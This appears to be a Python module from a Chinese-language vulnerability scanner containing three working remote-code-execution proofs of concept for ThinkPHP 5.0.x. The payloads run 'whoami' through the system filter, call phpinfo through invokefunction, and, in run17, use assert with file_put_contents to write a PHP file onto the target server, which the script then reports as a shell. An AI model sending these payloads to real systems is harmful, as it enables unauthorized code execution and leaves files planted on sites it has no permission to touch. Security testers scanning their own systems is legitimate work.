#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import urllib3
import requests
from libs.public.outprint import OutPrintInfo
from libs.public.reqset import ReqSet

urllib3.disable_warnings()


class ThinkRCEScan6:

    def __init__(self):
        self.proxy = None
        self.timeout = None
        self.ssl = None
        self.headers = None

    def run16(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "_method=__construct&method=GET&filter[]=system&get[]=whoami"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            if response.status_code == 200 and url == response.url:
                OutPrintInfo("ThinkPHP", '[b bright_red]可能存在ThinkPHP-5.0.15-RCE-POC-3 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}\n")
                with open("./result/thinkphpRce6.txt", "a") as w:
                    w.write(f"可能存在ThinkPHP-5.0.15-RCE-POC-3 {url} --- Data {data}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-3')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-3')
    def run17(self, urls):
        try:
            url = urls + '/?s=index/index'
            data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.post(url, headers=self.headers, verify=self.ssl, data=data,timeout=self.timeout,
                                     proxies=self.proxy)
            # response.encoding = response.apparent_encoding
            url2 = urls + "/zerosec.php"
            resp2 = requests.get(url2, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            resp2.encoding = response.apparent_encoding
            if "disable_functions" in resp2.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.15-RCE-POC-4 ')
                OutPrintInfo("ThinkPHP", f"{url}")
                OutPrintInfo("ThinkPHP", f"DATA:{data}")
                OutPrintInfo("ThinkPHP", f"SHELL {url2}\n")
                with open("./result/thinkphpRce6.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.0.15-RCE-POC-4 {url} --- Shell {url2} --- Data {data}\n")

            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-4')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.15-RCE-POC-4')
    def run18(self, urls):
        try:
            url = urls + '/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1'
            # data = "s=file_put_contents('zerosec.php','<?php phpinfo();')&_method=__construct&method=POST&filter[]=assert"
            response = requests.get(url, headers=self.headers, verify=self.ssl,timeout=self.timeout,
                                     proxies=self.proxy)
            response.encoding = response.apparent_encoding

            if "disable_functions" in response.text:
                OutPrintInfo("ThinkPHP", '[b bright_red]存在ThinkPHP-5.0.18-RCE-POC-1 ')
                OutPrintInfo("ThinkPHP", f"{url}\n")
                # OutPrintInfo("ThinkPHP", f"SHELL {url2}")
            # OutPrintInfo("ThinkPHP", f"DATA:{data}")
                with open("./result/thinkphpRce6.txt", "a") as w:
                    w.write(f"存在ThinkPHP-5.0.18-RCE-POC-1 {url}\n")
            else:
                pass
                # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-1')

        except Exception:
            pass
            # OutPrintInfo("ThinkPHP", '不存在ThinkPHP-5.0.18-RCE-POC-1')


    def main(self, target):
        # OutPrintInfo("ThinkPHP", '开始检测RCE...')
        url = target[0].strip('/ ')
        self.ssl = target[1]
        header = target[2]
        proxy = target[3]
        self.timeout = int(target[4])
        req = ReqSet(header=header)

        self.headers = req["header"]
        self.proxy = {"http": proxy, "https": proxy}

        self.run16(url)
        # OutPrintInfo("ThinkPHP", '开始POC-16...')
        self.run17(url)
        # OutPrintInfo("ThinkPHP", '开始POC-17...')
        self.run18(url)
